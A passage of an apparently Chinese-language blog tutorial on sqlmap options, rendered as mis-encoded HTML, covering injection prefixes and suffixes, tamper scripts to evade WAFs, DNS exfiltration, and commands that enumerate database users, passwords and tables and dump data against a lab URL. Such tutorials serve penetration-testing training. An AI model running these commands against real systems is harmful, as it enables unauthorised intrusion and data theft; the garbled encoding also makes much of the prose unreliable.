â€“invalid-logical</p><p>åœ¨sqlmapéœ€è¦ä½¿åŸå§‹å‚æ•°å€¼æ— æ•ˆ(ä¾‹å¦‚id&#x3D;13)æ—¶ï¼Œå®ƒä½¿ç”¨ç»å…¸çš„å¦å®š(ä¾‹å¦‚id&#x3D;-13)ã€‚æœ‰äº†è¿™ä¸ªå¼€å…³ï¼Œå°±å¯ä»¥å¼ºåˆ¶ä½¿ç”¨éšæœºå­—ç¬¦ä¸²æ¥å®ç°ç›¸åŒçš„ç›®æ ‡(ä¾‹å¦‚id&#x3D;akewmc)ã€‚ â€“invalid-string</p><h3 id="6-6-è‡ªå®šä¹‰æ³¨å…¥è´Ÿè½½ä½ç½®"><a href="#6-6-è‡ªå®šä¹‰æ³¨å…¥è´Ÿè½½ä½ç½®" class="headerlink" title="6.6 è‡ªå®šä¹‰æ³¨å…¥è´Ÿè½½ä½ç½®"></a>6.6 è‡ªå®šä¹‰æ³¨å…¥è´Ÿè½½ä½ç½®</h3><p>åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œåªæœ‰å½“ç”¨æˆ·æä¾›è¦é™„åŠ åˆ°æ³¨å…¥è´Ÿè½½çš„ç‰¹å®šåç¼€æ—¶ï¼Œæ˜“å—æ”»å‡»çš„å‚æ•°æ‰å¯è¢«åˆ©ç”¨ã€‚å½“ç”¨æˆ·å·²ç»çŸ¥é“æŸ¥è¯¢è¯­æ³•å¹¶å¸Œæœ›é€šè¿‡ç›´æ¥æä¾›æ³¨å…¥æœ‰æ•ˆè´Ÿè½½å‰ç¼€å’Œåç¼€æ¥æ£€æµ‹å’Œåˆ©ç”¨SQLæ³¨å…¥æ—¶ï¼Œè¿™äº›é€‰é¡¹å°±æ´¾ä¸Šç”¨åœºäº†ã€‚ â€“prefix è®¾ç½®SQLæ³¨å…¥Payloadå‰ç¼€ â€“suffix è®¾ç½®SQLæ³¨å…¥Payloadåç¼€</p><p>ä¾‹å¦‚ï¼š SQLæŸ¥è¯¢è¯­å¥ä¸ºï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">$query = <span class="hljs-string">&quot;SELECT * FROM users WHERE id=(&#x27; . $_GET[&#x27;id&#x27;] . &#x27;) LIMIT 0, 1&quot;</span>;<br></code></pre></td></tr></table></figure><p>sqlmapå‚æ•°ä½¿ç”¨ï¼š python sqlmap.py -u â€œ<a href="http://ip/sqlmap/mysql/get_str_brackets.php">http://ip/sqlmap/mysql/get_str_brackets.php</a> ?id&#x3D;1â€ -p id â€“prefix â€œâ€™)â€ â€“suffix â€œAND (â€˜abcâ€™&#x3D;â€™abcâ€</p><p>æ’å…¥Payloadåçš„SQLæŸ¥è¯¢è¯­å¥ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">$query = <span class="hljs-string">&quot;SELECT * FROM users WHERE id=(&#x27;1&#x27;) &lt;PAYLOAD&gt; AND (&#x27;abc&#x27;=&#x27;abc&#x27;) LIMIT 0, 1&quot;</span>;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022023912.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022023306.png" alt="img"></p><h3 id="6-7-è®¾ç½®-Tamper-è„šæœ¬"><a href="#6-7-è®¾ç½®-Tamper-è„šæœ¬" class="headerlink" title="6.7 è®¾ç½® Tamper è„šæœ¬"></a>6.7 è®¾ç½® Tamper è„šæœ¬</h3><p>sqlmapæœ¬èº«ä¸ä¼šæ··æ·†å‘é€çš„æœ‰æ•ˆè´Ÿè½½ï¼Œé™¤äº†å•å¼•å·ä¹‹é—´çš„å­—ç¬¦ä¸²è¢«CHAR()ç±»ä¼¼çš„è¡¨ç¤ºå½¢å¼æ‰€å–ä»£ä¹‹å¤–ã€‚sqlmapé€šè¿‡Tamperè„šæœ¬æ¥ç»•è¿‡WAFç­‰é˜²å¾¡æªæ–½ï¼Œå¯ä»¥åœ¨tamperæ–‡ä»¶å¤¹ä¸‹æ‰¾åˆ°æ‰€æœ‰sqlmapè‡ªå¸¦çš„tamperè„šæœ¬ã€‚</p><p>sqlmap.py -u â€œ<a href="http://ip/sqlmap/mysql/get_int.php?id=1%E2%80%9D">http://ip/sqlmap/mysql/get_int.php?id=1â€</a> â€“tamperâ€œbetween.py,randomcase.py,space2comment.pyâ€ -v 3</p><h3 id="6-8-è®¾ç½®-DBMS-è®¤è¯"><a href="#6-8-è®¾ç½®-DBMS-è®¤è¯" class="headerlink" title="6.8 è®¾ç½® DBMS è®¤è¯"></a>6.8 è®¾ç½® DBMS è®¤è¯</h3><p>è®¾ç½®DBMSè®¤è¯æ–¹å¼é€šè¿‡ä»¥ä¸‹å‘½ä»¤ï¼š</p><p>â€“dbms-cred &#x3D; username:password</p><h2 id="0x07-sqlmap-è‡ªå®šä¹‰æ£€æµ‹å‚æ•°"><a href="#0x07-sqlmap-è‡ªå®šä¹‰æ£€æµ‹å‚æ•°" class="headerlink" title="0x07 sqlmap è‡ªå®šä¹‰æ£€æµ‹å‚æ•°"></a>0x07 sqlmap è‡ªå®šä¹‰æ£€æµ‹å‚æ•°</h2><h3 id="7-1-è®¾ç½®æ¢æµ‹ç­‰çº§"><a href="#7-1-è®¾ç½®æ¢æµ‹ç­‰çº§" class="headerlink" title="7.1 è®¾ç½®æ¢æµ‹ç­‰çº§"></a>7.1 è®¾ç½®æ¢æµ‹ç­‰çº§</h3><p>â€“level æ­¤é€‰é¡¹éœ€è¦æŒ‡å®šè¦æ‰§è¡Œçš„æµ‹è¯•ç­‰çº§çš„å‚æ•°ã€‚æœ‰äº”ä¸ªå±‚æ¬¡ã€‚åœ¨æ‰§è¡Œæœ‰é™æ•°é‡çš„æµ‹è¯•(è¯·æ±‚)æ—¶ï¼Œé»˜è®¤å€¼ä¸º1ã€‚1~5æ¢æµ‹å¤æ‚é€æ­¥æå‡ã€‚</p><p>sqlmapä½¿ç”¨çš„æœ‰æ•ˆè´Ÿè½½åœ¨æ–‡æœ¬æ–‡ä»¶xml&#x2F;payload .xmlä¸­æŒ‡å®šã€‚æŒ‰ç…§æ–‡ä»¶é¡¶éƒ¨çš„è¯´æ˜ï¼Œå¦‚æœsqlmapé”™è¿‡äº†æ³¨å…¥ï¼Œæ‚¨ä¹Ÿåº”è¯¥èƒ½å¤Ÿæ·»åŠ è‡ªå·±çš„æœ‰æ•ˆè´Ÿè½½æ¥è¿›è¡Œæµ‹è¯•!</p><p>è¿™ä¸ªé€‰é¡¹ä¸ä»…ä¼šå½±å“åˆ°å“ªä¸ªæœ‰æ•ˆè´Ÿè½½sqlmapå°è¯•ï¼Œè¿˜ä¼šå½±å“åˆ°åœ¨è€ƒè¯•ä¸­å–å“ªä¸ªæ³¨å…¥ç‚¹:GETå’ŒPOSTå‚æ•°æ€»æ˜¯è¢«æµ‹è¯•ï¼ŒHTTP Cookieå¤´å€¼ä»ç¬¬2çº§æµ‹è¯•ï¼ŒHTTPç”¨æˆ·ä»£ç†&#x2F;å¼•ç”¨å¤´å€¼ä»ç¬¬3çº§æµ‹è¯•ã€‚</p><p>æ€»ä¹‹ï¼Œæ£€æµ‹SQLæ³¨å…¥è¶Šå›°éš¾ï¼Œå¿…é¡»è®¾ç½®çš„â€”â€”çº§åˆ«å°±è¶Šé«˜ã€‚ åœ¨æ˜¾ç¤ºæ— æ³•æ³¨å…¥æ—¶ï¼Œå¯ä»¥è®¾ç½® â€“level 5 æ¥è¿›è¡Œæ›´å¼ºå¤§çš„æ¢æµ‹</p><h3 id="7-2-è®¾ç½®é£é™©å‚æ•°"><a href="#7-2-è®¾ç½®é£é™©å‚æ•°" class="headerlink" title="7.2 è®¾ç½®é£é™©å‚æ•°"></a>7.2 è®¾ç½®é£é™©å‚æ•°</h3><p>æ­¤é€‰é¡¹éœ€è¦æŒ‡å®šè¦æ‰§è¡Œæµ‹è¯•çš„é£é™©çš„å‚æ•°ã€‚æœ‰ä¸‰ä¸ªé£é™©å€¼ã€‚é»˜è®¤å€¼ä¸º1ï¼Œè¿™å¯¹äºå¤§å¤šæ•°SQLæ³¨å…¥ç‚¹æ¥è¯´æ˜¯æ— å®³çš„ã€‚é£é™©å€¼2å¢åŠ äº†å¤§é‡åŸºäºæŸ¥è¯¢æ—¶é—´çš„SQLæ³¨å…¥æµ‹è¯•çš„é»˜è®¤çº§åˆ«ï¼Œå€¼3ä¹Ÿå¢åŠ äº†åŸºäºorçš„SQLæ³¨å…¥æµ‹è¯•ã€‚</p><p>åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæ¯”å¦‚UPDATEè¯­å¥ä¸­çš„SQLæ³¨å…¥ï¼Œæ³¨å…¥åŸºäºorçš„æœ‰æ•ˆè´Ÿè½½å¯èƒ½å¯¼è‡´è¡¨çš„æ‰€æœ‰æ¡ç›®çš„æ›´æ–°ï¼Œè¿™è‚¯å®šä¸æ˜¯æ”»å‡»è€…æƒ³è¦çš„ã€‚å‡ºäºè¿™ä¸ªåŸå› å’Œå…¶ä»–åŸå› ï¼Œæˆ‘ä»¬å¼•å…¥äº†è¿™ä¸ªé€‰é¡¹:ç”¨æˆ·å¯ä»¥æ§åˆ¶æµ‹è¯•çš„æœ‰æ•ˆè´Ÿè½½ï¼Œç”¨æˆ·å¯ä»¥ä»»æ„é€‰æ‹©ä½¿ç”¨ä¹Ÿæœ‰æ½œåœ¨å±é™©çš„è´Ÿè½½ã€‚</p><p>ä¾‹å¦‚ï¼š â€“risk num numèŒƒå›´ 1~3</p><h3 id="7-3-è®¾ç½®é¡µé¢æ¯”è¾ƒå‚æ•°"><a href="#7-3-è®¾ç½®é¡µé¢æ¯”è¾ƒå‚æ•°" class="headerlink" title="7.3 è®¾ç½®é¡µé¢æ¯”è¾ƒå‚æ•°"></a>7.3 è®¾ç½®é¡µé¢æ¯”è¾ƒå‚æ•°</h3><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œé€šè¿‡æ¯”è¾ƒæ³¨å…¥çš„è¯·æ±‚é¡µé¢å†…å®¹å’Œæœªæ³¨å…¥çš„åŸå§‹é¡µé¢å†…å®¹ï¼Œå¯ä»¥åŒºåˆ†çœŸæŸ¥è¯¢å’Œå‡æŸ¥è¯¢ã€‚è¿™ç§è§‚å¿µå¹¶ä¸æ€»æ˜¯èµ·ä½œç”¨æ˜¯å› ä¸ºåœ¨æ¯æ¬¡åˆ·æ–°é¡µé¢å†…å®¹çš„å˜åŒ–æœ‰æ—¶ç”šè‡³æ²¡æœ‰æ³¨å°„,ä¾‹å¦‚å½“é¡µé¢æœ‰ä¸€ä¸ªè®¡æ•°å™¨,ä¸€ä¸ªåŠ¨æ€å¹¿å‘Šæ¨ªå¹…æˆ–ä»»ä½•å…¶ä»–HTMLçš„ä¸€éƒ¨åˆ†å‘ˆç°åŠ¨æ€å’Œå¯èƒ½æ”¹å˜æ—¶é—´ä¸ä»…å› æ­¤ç”¨æˆ·çš„è¾“å…¥ã€‚ä¸ºäº†ç»•è¿‡è¿™ä¸ªé™åˆ¶ï¼ŒsqlmapåŠªåŠ›è¯†åˆ«å“åº”ä½“çš„è¿™äº›ç‰‡æ®µå¹¶è¿›è¡Œç›¸åº”å¤„ç†ã€‚</p><p>â€“stringï¼šæŒ‡å®šåŒ…å«å­—ç¬¦ä¸² æŸ¥è¯¢ä¸ºTrue â€“not-stringï¼šæŒ‡å®šåŒ…å«å­—ç¬¦ä¸² æŸ¥è¯¢ä¸ºFalse â€“regexpï¼šæŒ‡å®šé€šè¿‡æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…å­—ç¬¦ä¸²,æŸ¥è¯¢ä¸ºTrue â€“codeï¼šæŒ‡å®šåŒ¹é…HTTPçŠ¶æ€å“åº”ç ï¼ŒæŸ¥è¯¢ä¸ºTrue</p><h3 id="7-4-è®¾ç½®å†…å®¹æ¯”è¾ƒå‚æ•°"><a href="#7-4-è®¾ç½®å†…å®¹æ¯”è¾ƒå‚æ•°" class="headerlink" title="7.4 è®¾ç½®å†…å®¹æ¯”è¾ƒå‚æ•°"></a>7.4 è®¾ç½®å†…å®¹æ¯”è¾ƒå‚æ•°</h3><p>â€“text-onlyï¼šè®¾ç½®é¡µé¢å†…å®¹ä¸­åŒ…å«æ–‡æœ¬ã€‚</p><p>ä¾‹å¦‚ï¼šâ€“text-only &#x3D; â€œWelcome for True and Forbidden for Falseâ€</p><p>â€“titlesï¼šè®¾ç½®é¡µé¢titleä¸­åŒ…å«æ–‡æœ¬ã€‚å‰æéœ€è¦çŸ¥é“å¦‚ä½•åŒºåˆ†æŸ¥è¯¢çš„çœŸä¸å‡ï¼Œæ ¹æ®è¿”å›å­—ç¬¦ä¸²å†…å®¹ä¸åŒã€‚ â€“titles&#x3D;â€Loginâ€</p><h2 id="0x08-sqlmap-æ³¨å…¥æŠ€æœ¯å‚æ•°"><a href="#0x08-sqlmap-æ³¨å…¥æŠ€æœ¯å‚æ•°" class="headerlink" title="0x08 sqlmap æ³¨å…¥æŠ€æœ¯å‚æ•°"></a>0x08 sqlmap æ³¨å…¥æŠ€æœ¯å‚æ•°</h2><h3 id="8-1-è®¾ç½®å…·ä½“-SQL-æ³¨å…¥æŠ€æœ¯"><a href="#8-1-è®¾ç½®å…·ä½“-SQL-æ³¨å…¥æŠ€æœ¯" class="headerlink" title="8.1 è®¾ç½®å…·ä½“ SQL æ³¨å…¥æŠ€æœ¯"></a>8.1 è®¾ç½®å…·ä½“ SQL æ³¨å…¥æŠ€æœ¯</h3><p>â€“technique å‚æ•°ç”¨æ¥è®¾ç½®å…·ä½“SQLæ³¨å…¥æŠ€æœ¯ã€‚ä»¥ä¸‹åˆ—å‡ºSqlmapæ”¯æŒçš„SQLæ³¨å…¥æŠ€æœ¯ã€‚</p><p>B: Boolean-based blind åŸºäºå¸ƒå°”çš„ç›²æ³¨ E: Error-based æŠ¥é”™æ³¨å…¥ U: Union query-based UnionæŸ¥è¯¢æ³¨å…¥ S: Stacked queries å †å æ³¨å…¥ T: Time-based blind åŸºäºæ—¶é—´çš„ç›²æ³¨ Q: Inline queries å†…è”æŸ¥è¯¢æ³¨å…¥</p><p>ä¾‹å¦‚ï¼šsqlmap -u â€œå­˜åœ¨æ³¨å…¥ç‚¹çš„URLâ€ â€“technique B â€“current-db åˆ©ç”¨åŸºäºå¸ƒå°”çš„ç›²æ³¨å¯¹æ³¨å…¥ç‚¹è¿›è¡ŒSQLæ³¨å…¥æ¢æµ‹</p><h3 id="8-2-è®¾ç½®æ—¶é—´ç›²æ³¨å»¶è¿Ÿæ—¶é—´"><a href="#8-2-è®¾ç½®æ—¶é—´ç›²æ³¨å»¶è¿Ÿæ—¶é—´" class="headerlink" title="8.2 è®¾ç½®æ—¶é—´ç›²æ³¨å»¶è¿Ÿæ—¶é—´"></a>8.2 è®¾ç½®æ—¶é—´ç›²æ³¨å»¶è¿Ÿæ—¶é—´</h3><p>åœ¨æµ‹è¯•åŸºäºæ—¶é—´çš„ç›²SQLæ³¨å…¥æ—¶ï¼Œå¯ä»¥è®¾ç½®ç§’æ¥å»¶è¿Ÿå“åº”ï¼Œæ–¹æ³•æ˜¯æä¾›â€“time-secé€‰é¡¹ï¼Œåé¢è·Ÿç€ä¸€ä¸ªæ•´æ•°ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œå®ƒçš„å€¼è®¾ç½®ä¸º5ç§’ã€‚</p><p>ä¾‹å¦‚ï¼š sqlmap -u â€œå­˜åœ¨æ³¨å…¥ç‚¹çš„URLâ€ â€“time-sec 3 â€“current-db </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020200.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020601.png" alt="img"></p><h3 id="8-3-è®¾ç½®-UNION-å­—æ®µæ•°"><a href="#8-3-è®¾ç½®-UNION-å­—æ®µæ•°" class="headerlink" title="8.3 è®¾ç½® UNION å­—æ®µæ•°"></a>8.3 è®¾ç½® UNION å­—æ®µæ•°</h3><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œsqlmapæµ‹è¯•ä½¿ç”¨1åˆ°10åˆ—çš„UNIONæŸ¥è¯¢SQLæ³¨å…¥æŠ€æœ¯ã€‚ä½†æ˜¯ï¼Œé€šè¿‡æä¾›æ›´é«˜â€“levelå€¼ï¼Œå¯ä»¥å°†æ­¤èŒƒå›´å¢åŠ åˆ°50åˆ—ã€‚</p><p>æ‚¨å¯ä»¥æ‰‹åŠ¨å‘Šè¯‰sqlmapä½¿ç”¨ç‰¹å®šèŒƒå›´çš„åˆ—æ¥æµ‹è¯•è¿™ç§ç±»å‹çš„SQLæ³¨å…¥ï¼Œæ–¹æ³•æ˜¯ä¸ºè¯¥å·¥å…·æä¾›é€‰â€“union-colsåè·Ÿä¸€ç³»åˆ—æ•´æ•°ã€‚ä¾‹å¦‚ï¼Œ12-16è¡¨ç¤ºä½¿ç”¨12åˆ°16ä¸ªåˆ—å¯¹UNIONæŸ¥è¯¢SQLæ³¨å…¥è¿›è¡Œæµ‹è¯•ã€‚</p><p>ä¾‹å¦‚ï¼šsqlmap -u â€œå­˜åœ¨æ³¨å…¥çš„URLâ€ â€“union-cols 12-18 â€“current-db</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022023721.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020336.png" alt="img"></p><h3 id="8-4-è®¾ç½®-UNION-å­—ç¬¦"><a href="#8-4-è®¾ç½®-UNION-å­—ç¬¦" class="headerlink" title="8.4 è®¾ç½® UNION å­—ç¬¦"></a>8.4 è®¾ç½® UNION å­—ç¬¦</h3><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œsqlmapæµ‹è¯•ä½¿ç”¨ç©ºå­—ç¬¦çš„è”åˆæŸ¥è¯¢SQLæ³¨å…¥æŠ€æœ¯ã€‚ä½†æ˜¯ï¼Œé€šè¿‡æä¾›æ›´é«˜çº§åˆ«çš„å€¼sqlmapï¼Œè¿˜å°†ä½¿ç”¨éšæœºæ•°æ‰§è¡Œæµ‹è¯•ï¼Œå› ä¸ºåœ¨æŸäº›æƒ…å†µä¸‹ï¼ŒUNIONæŸ¥è¯¢æµ‹è¯•ä½¿ç”¨NULLä¼šå¤±è´¥ï¼Œè€Œä½¿ç”¨éšæœºæ•´æ•°åˆ™ä¼šæˆåŠŸã€‚</p><p>æ‚¨å¯ä»¥æ‰‹åŠ¨å‘Šè¯‰sqlmapä½¿ç”¨ç‰¹å®šå­—ç¬¦æµ‹è¯•è¿™ç§ç±»å‹çš„SQLæ³¨å…¥ï¼Œæ–¹æ³•æ˜¯ä½¿ç”¨å¸¦æœ‰æ‰€éœ€å­—ç¬¦å€¼çš„é€‰é¡¹â€“union-char(ä¾‹å¦‚â€“union-char 123)ã€‚ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022023449.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022023060.png" alt="img"></p><h3 id="8-5-è®¾ç½®-UNION-æŸ¥è¯¢è¡¨"><a href="#8-5-è®¾ç½®-UNION-æŸ¥è¯¢è¡¨" class="headerlink" title="8.5 è®¾ç½® UNION æŸ¥è¯¢è¡¨"></a>8.5 è®¾ç½® UNION æŸ¥è¯¢è¡¨</h3><p>æŸäº›æƒ…å†µä¸‹ï¼ŒSqlmapéœ€è¦è®¾å®šUnion æŸ¥è¯¢SQLæ³¨å…¥çš„å…·ä½“æ•°æ®è¡¨æ‰å¯ä»¥å¾—åˆ°æ•°æ®ã€‚ â€“union-from è¡¨å </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020332.png" alt="img"></p><h3 id="8-6-è®¾ç½®-DNS-éœ²å‡ºæ”»å‡»"><a href="#8-6-è®¾ç½®-DNS-éœ²å‡ºæ”»å‡»" class="headerlink" title="8.6 è®¾ç½® DNS éœ²å‡ºæ”»å‡»"></a>8.6 è®¾ç½® DNS éœ²å‡ºæ”»å‡»</h3><p>é’ˆå¯¹ç›®æ ‡ç½‘ç»œå¾ˆæœ‰å¯èƒ½å¯¹å¤–éƒ¨æµé‡è¿›è¡Œé™åˆ¶ï¼Œæˆ–è€…è®¾ç½®WAFã€‚</p><p>é€šè¿‡è®¾ç½®DNSæµé‡æ¥çªç ´é™åˆ¶ â€“dns-domain â€œdnsæœåŠ¡å™¨â€ éœ€è¦ç”¨æˆ·è‡ªèº«å…·æœ‰ä¸€ä¸ªå¼€æ”¾53ç«¯å£çš„DNSæœåŠ¡å™¨ï¼Œé€šè¿‡DNSæµé‡æ¥è·å¾—Webåº”ç”¨ç¨‹åºä¸­æ•°æ®å†…å®¹ã€‚ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020213.png" alt="img"></p><h3 id="8-7-è®¾ç½®äºŒæ¬¡æ³¨å…¥"><a href="#8-7-è®¾ç½®äºŒæ¬¡æ³¨å…¥" class="headerlink" title="8.7 è®¾ç½®äºŒæ¬¡æ³¨å…¥"></a>8.7 è®¾ç½®äºŒæ¬¡æ³¨å…¥</h3><p>Sqlmapä¸­å¯ä»¥è®¾ç½®äºŒæ¬¡æ³¨å…¥çš„ç»“æœé¡µé¢ã€‚ â€“second-url URL </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020417.png" alt="img"></p><h3 id="8-8-è¯†åˆ«æŒ‡çº¹"><a href="#8-8-è¯†åˆ«æŒ‡çº¹" class="headerlink" title="8.8 è¯†åˆ«æŒ‡çº¹"></a>8.8 è¯†åˆ«æŒ‡çº¹</h3><p>â€“fingerprint -f æ¢æµ‹ç›®æ ‡æŒ‡çº¹ä¿¡æ¯ã€‚ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022023448.png" alt="img"></p><h2 id="0x09-sqlmap-æ£€ç´¢-DBMS-ä¿¡æ¯"><a href="#0x09-sqlmap-æ£€ç´¢-DBMS-ä¿¡æ¯" class="headerlink" title="0x09 sqlmap æ£€ç´¢ DBMS ä¿¡æ¯"></a>0x09 sqlmap æ£€ç´¢ DBMS ä¿¡æ¯</h2><h3 id="9-1-æ£€ç´¢-DBMS-Banner-ä¿¡æ¯"><a href="#9-1-æ£€ç´¢-DBMS-Banner-ä¿¡æ¯" class="headerlink" title="9.1 æ£€ç´¢ DBMS Banner ä¿¡æ¯"></a>9.1 æ£€ç´¢ DBMS Banner ä¿¡æ¯</h3><p>è·å–åç«¯æ•°æ®åº“Bannerä¿¡æ¯ã€‚ â€“banneræˆ–è€… -b </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022023235.png" alt="img"></p><h3 id="9-2-æ£€ç´¢-DBMS-å½“å‰ç”¨æˆ·"><a href="#9-2-æ£€ç´¢-DBMS-å½“å‰ç”¨æˆ·" class="headerlink" title="9.2 æ£€ç´¢ DBMS å½“å‰ç”¨æˆ·"></a>9.2 æ£€ç´¢ DBMS å½“å‰ç”¨æˆ·</h3><p>è·å–DBMSå½“å‰ç”¨æˆ· â€“current-user </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020891.png" alt="img"></p><h3 id="9-3-æ£€ç´¢-DBMS-å½“å‰æ•°æ®åº“"><a href="#9-3-æ£€ç´¢-DBMS-å½“å‰æ•°æ®åº“" class="headerlink" title="9.3 æ£€ç´¢ DBMS å½“å‰æ•°æ®åº“"></a>9.3 æ£€ç´¢ DBMS å½“å‰æ•°æ®åº“</h3><p>è·å–å½“å‰æ•°æ®åº“åã€‚ â€“current-db </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022024028.png" alt="img"></p><h3 id="9-4-æ£€ç´¢-DBMS-å½“å‰ä¸»æœºå"><a href="#9-4-æ£€ç´¢-DBMS-å½“å‰ä¸»æœºå" class="headerlink" title="9.4 æ£€ç´¢ DBMS å½“å‰ä¸»æœºå"></a>9.4 æ£€ç´¢ DBMS å½“å‰ä¸»æœºå</h3><p>â€“hostname </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020400.png" alt="img"></p><h2 id="0x0A-sqlmap-æšä¸¾-DBMS-ä¿¡æ¯"><a href="#0x0A-sqlmap-æšä¸¾-DBMS-ä¿¡æ¯" class="headerlink" title="0x0A sqlmap æšä¸¾ DBMS ä¿¡æ¯"></a>0x0A sqlmap æšä¸¾ DBMS ä¿¡æ¯</h2><h3 id="10-1-æ¢æµ‹å½“å‰ç”¨æˆ·-DBA"><a href="#10-1-æ¢æµ‹å½“å‰ç”¨æˆ·-DBA" class="headerlink" title="10.1 æ¢æµ‹å½“å‰ç”¨æˆ· DBA"></a>10.1 æ¢æµ‹å½“å‰ç”¨æˆ· DBA</h3><p>â€“is-dba æ¢æµ‹å½“å‰ç”¨æˆ·æ˜¯å¦æ˜¯æ•°æ®åº“ç®¡ç†å‘˜ã€‚</p><p>è‹¥è¿”å›Trueï¼Œåˆ™è¯´æ˜å½“å‰ç”¨æˆ·æ˜¯æ•°æ®åº“ç®¡ç†å‘˜ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022024791.png" alt="img"></p><h3 id="10-2-æšä¸¾-DBMS-ç”¨æˆ·"><a href="#10-2-æšä¸¾-DBMS-ç”¨æˆ·" class="headerlink" title="10.2 æšä¸¾ DBMS ç”¨æˆ·"></a>10.2 æšä¸¾ DBMS ç”¨æˆ·</h3><p>è·å–DBMSæ‰€æœ‰ç”¨æˆ· â€“users</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020245.png" alt="img"></p><h3 id="10-3-æšä¸¾-DBMS-ç”¨æˆ·å¯†ç "><a href="#10-3-æšä¸¾-DBMS-ç”¨æˆ·å¯†ç " class="headerlink" title="10.3 æšä¸¾ DBMS ç”¨æˆ·å¯†ç "></a>10.3 æšä¸¾ DBMS ç”¨æˆ·å¯†ç </h3><p>â€“password è·å–ç”¨æˆ·å¯†ç </p><h3 id="10-4-æšä¸¾-DBMS-æƒé™"><a href="#10-4-æšä¸¾-DBMS-æƒé™" class="headerlink" title="10.4 æšä¸¾ DBMS æƒé™"></a>10.4 æšä¸¾ DBMS æƒé™</h3><p>â€“privileges â€“role(è§’è‰²) </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022024501.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022024378.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020399.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020080.png" alt="img"></p><h3 id="10-5-æšä¸¾æ•°æ®åº“å"><a href="#10-5-æšä¸¾æ•°æ®åº“å" class="headerlink" title="10.5 æšä¸¾æ•°æ®åº“å"></a>10.5 æšä¸¾æ•°æ®åº“å</h3><p>â€“dbs åˆ—ä¸¾æ•°æ®åº“åç§° </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020994.png" alt="img"></p><h3 id="10-6-æšä¸¾æ•°æ®åº“è¡¨"><a href="#10-6-æšä¸¾æ•°æ®åº“è¡¨" class="headerlink" title="10.6 æšä¸¾æ•°æ®åº“è¡¨"></a>10.6 æšä¸¾æ•°æ®åº“è¡¨</h3><p>â€“tables æšä¸¾è¡¨å â€“&gt; æŒ‡å®šå…·ä½“æ•°æ®åº“ -D æ•°æ®åº“å â€“exclude-sysdbs åªåˆ—å‡ºç”¨æˆ·è‡ªå·±æ–°å»ºçš„æ•°æ®åº“å’Œè¡¨ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022024510.png" alt="img"></p><p> ï¼ˆæ’é™¤DBMSç³»ç»Ÿæ•°æ®åº“ï¼Œå½“æšä¸¾è¡¨æ—¶ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022024789.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022024774.png" alt="img"></p><h3 id="10-7-æšä¸¾æ•°æ®åº“è¡¨çš„åˆ—å"><a href="#10-7-æšä¸¾æ•°æ®åº“è¡¨çš„åˆ—å" class="headerlink" title="10.7 æšä¸¾æ•°æ®åº“è¡¨çš„åˆ—å"></a>10.7 æšä¸¾æ•°æ®åº“è¡¨çš„åˆ—å</h3><p>â€“columns -DæŒ‡å®šæ•°æ®åº“ -TæŒ‡å®šæ•°æ®è¡¨ -CæŒ‡å®šå…·ä½“å­—æ®µ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020147.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022024183.png" alt="img"></p><h3 id="10-8-æšä¸¾æ•°æ®å€¼"><a href="#10-8-æšä¸¾æ•°æ®å€¼" class="headerlink" title="10.8 æšä¸¾æ•°æ®å€¼"></a>10.8 æšä¸¾æ•°æ®å€¼</h3><p>â€“dump </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020572.png" 